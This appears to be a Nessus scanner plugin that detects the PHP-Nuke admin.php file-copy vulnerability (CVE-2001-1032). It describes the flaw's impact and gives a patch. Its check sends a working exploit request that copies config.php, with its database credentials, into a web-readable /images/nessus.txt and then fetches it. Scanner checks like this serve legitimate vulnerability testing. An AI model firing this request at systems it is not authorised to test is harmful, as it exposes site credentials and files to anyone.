if (description)
{
 script_id(10772);
 script_cve_id("CVE-2001-1032");
 script_bugtraq_id(3361);
 script_version ("$Revision: 1.15 $");
 script_name(english:"PHP-Nuke copying files security vulnerability (admin.php)");
 desc["english"] = "
The remote host seems to be vulnerable to a security problem in 
PHP-Nuke (admin.php). 
The vulnerability is caused by inadequate processing of queries 
by PHP-Nuke's admin.php which enables attackers to copy any file 
from the operating system to anywhere else on the operating system.

Impact:
Every file that the webserver has access to can be read by anyone. 
Furthermore, any file can be overwritten. 
Usernames (used for database access) can be compromised. 
Administrative privileges can be gained by copying sensitive files.

Solution:
Change the following lines in admin.php:
if($upload) 
To:

if (($upload) && ($admintest)) 

Or upgrade to the latest version (Version 5.3 and above).

Risk factor : High

Additional information:
http://www.securiteam.com/unixfocus/TOBA";

 script_description(english:desc["english"]);
 script_summary(english:"Determine if a remote host is vulnerable to the admin.php vulnerability");
 script_category(ACT_GATHER_INFO);
 script_family(english:"CGI abuses", francais:"Abus de CGI");
 script_copyright(english:"This script is Copyright (C) 2001 SecurITeam");
 script_dependencie("find_service.nes", "no404.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_kb_item("Services/www");
if (!port) port = 80;


if(!get_port_state(port))exit(0);
if(http_is_dead(port:port))exit(0);


function check(loc)
{
 data = string(loc, "admin.php?upload=1&file=config.php&file_name=nessus.txt&wdir=/images/&userfile=config.php&userfile_name=nessus.txt");
 req = http_get(item:data, port:port);
 buf = http_keepalive_send_recv(port:port, data:req);
 if(buf == NULL)exit(0);
 
  
  if ("SAFE MODE " >< buf)
    {
     security_note(port);
     exit(0);
    }
    
    if ("Unable to create " >< buf)
    {
     security_hole(port);
     exit(0);
    }
   
 

  req = http_get(item:"/images/nessus.txt", port:port);
  buf = http_keepalive_send_recv(port:port, data:req);
    if (("PHP-NUKE: Web Portal System" >< buf) && (("?php" >< buf) || ("?PHP" >< buf)) )
    {
     security_hole(port);
     exit(0);
    }
}
 
foreach dir (make_list("", cgi_dirs()))
{
check(loc:string(dir, "/"));
}
